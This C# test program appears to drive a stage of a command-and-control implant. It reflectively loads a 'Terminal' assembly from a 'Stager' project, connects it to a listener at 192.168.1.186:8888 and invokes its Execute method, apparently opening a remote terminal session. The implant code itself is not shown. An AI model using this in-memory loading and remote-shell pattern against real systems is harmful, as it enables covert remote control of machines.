using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using Reno.Comm;
using System.IO;
using System.Reflection;

namespace TerminalTest
{
    class Program
    {
        static void Main(string[] args)
        {
            string assembly = @"C:\Users\kylee\source\repos\Stager\Terminal\bin\Debug\netstandard2.0\Terminal.dll";
            byte[] assemblyBytes = File.ReadAllBytes(assembly);
            Assembly a = Assembly.Load(assemblyBytes);
            Type terminal = a.GetType("Reno.Stages.Terminal");
            ClearChannel channel = new ClearChannel("192.168.1.186", 8888, "DEFLATE");
            object[] p = new object[1];
            p[0] = channel;
            var terminalInstance = Activator.CreateInstance(terminal, p);
            var executeTerminal = terminal.GetMethod("Execute");
            executeTerminal.Invoke(terminalInstance, null);
            Console.ReadLine();
        }
    }
}
